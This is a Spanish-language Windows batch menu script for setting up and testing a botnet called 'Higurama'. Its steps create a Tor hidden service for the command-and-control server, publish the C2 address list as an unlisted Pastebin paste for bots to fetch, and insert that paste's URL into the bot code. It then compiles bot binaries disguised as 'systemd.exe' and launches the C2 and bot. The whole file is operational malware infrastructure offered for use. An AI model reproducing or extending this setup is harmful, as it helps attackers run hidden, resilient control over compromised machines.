@echo off
title Higurama - Configuracion Rapida
color 0A

:menu
cls
echo.
echo ========================================
echo   HIGURAMA - CONFIGURACION RAPIDA
echo ========================================
echo.
echo [1] Instalar dependencias
echo [2] Setup Tor + generar .onion
echo [3] Abrir Pastebin para subir JSON
echo [4] Editar configuracion del bot
echo [5] Compilar binarios
echo [6] Probar sistema (C2 + Bot)
echo [7] Ver estado de configuracion
echo [0] Salir
echo.
set /p choice="Selecciona opcion: "

if "%choice%"=="1" goto install_deps
if "%choice%"=="2" goto setup_tor
if "%choice%"=="3" goto open_pastebin
if "%choice%"=="4" goto edit_config
if "%choice%"=="5" goto compile
if "%choice%"=="6" goto test_system
if "%choice%"=="7" goto check_status
if "%choice%"=="0" goto end
goto menu

:install_deps
cls
echo.
echo [*] Instalando dependencias...
pip install -r config\requirements.txt
echo.
echo [OK] Dependencias instaladas!
pause
goto menu

:setup_tor
cls
echo.
echo [*] Configurando Tor Hidden Service...
python scripts\setup_tor_c2.py
echo.
echo [!] IMPORTANTE: Copia tu direccion .onion generada
echo [!] Necesitaras subirla a Pastebin en el siguiente paso
pause
goto menu

:open_pastebin
cls
echo.
echo [*] Abriendo Pastebin y archivo JSON...
start https://pastebin.com/
start notepad config\c2_servers.json
echo.
echo PASOS:
echo 1. Copia el contenido del archivo JSON que se abrio
echo 2. Pegalo en Pastebin
echo 3. Visibility: Unlisted
echo 4. Crear paste
echo 5. Click derecho en RAW y copiar URL
echo 6. Continua con opcion 4 para pegar la URL
pause
goto menu

:edit_config
cls
echo.
echo [*] Abriendo archivos de configuracion...
start notepad src\higurashi.py
echo.
echo INSTRUCCIONES:
echo 1. Busca la linea 45: JSON_URLS = [
echo 2. Reemplaza YOUR_PASTE_ID con tu ID de Pastebin
echo 3. Guarda el archivo (Ctrl+S)
echo 4. Cierra el notepad
pause
goto menu

:compile
cls
echo.
echo [*] Compilando binarios...
python scripts\COMPILE_NOW.bat
pause
goto menu

:test_system
cls
echo.
echo [*] Iniciando sistema de prueba...
echo.
echo [1/2] Iniciando C2 Commander...
start cmd /k "cd /d %~dp0 && python src\higurama.py"
timeout /t 3 >nul
echo [2/2] Iniciando Bot...
start cmd /k "cd /d %~dp0 && python src\higurashi.py"
echo.
echo [OK] Sistema iniciado!
echo [*] Observa las ventanas para ver la conexion
pause
goto menu

:check_status
cls
echo.
echo ========================================
echo   ESTADO DE CONFIGURACION
echo ========================================
echo.

REM Check dependencies
pip show paramiko >nul 2>&1
if %errorlevel%==0 (
    echo [OK] Dependencias instaladas
) else (
    echo [X] Dependencias NO instaladas
    echo     Ejecuta opcion 1
)

REM Check Tor
where tor >nul 2>&1
if %errorlevel%==0 (
    echo [OK] Tor instalado
) else (
    echo [X] Tor NO instalado
    echo     Ejecuta opcion 2
)

REM Check JSON config
findstr /C:"YOUR_PASTE_ID" src\higurashi.py >nul
if %errorlevel%==0 (
    echo [X] JSON URL NO configurado
    echo     Ejecuta opciones 3 y 4
) else (
    echo [OK] JSON URL configurado
)

REM Check onion
findstr /C:"YOUR_ONION_ADDRESS" config\c2_servers.json >nul
if %errorlevel%==0 (
    echo [X] Direccion .onion NO configurada
    echo     Ejecuta opcion 2
) else (
    echo [OK] Direccion .onion configurada
)

REM Check binaries
if exist "bots\windows\x64\systemd.exe" (
    echo [OK] Binarios compilados
) else (
    echo [~] Binarios NO compilados (opcional)
    echo     Ejecuta opcion 5
)

echo.
echo ========================================
pause
goto menu

:end
echo.
echo Hasta luego!
timeout /t 2 >nul
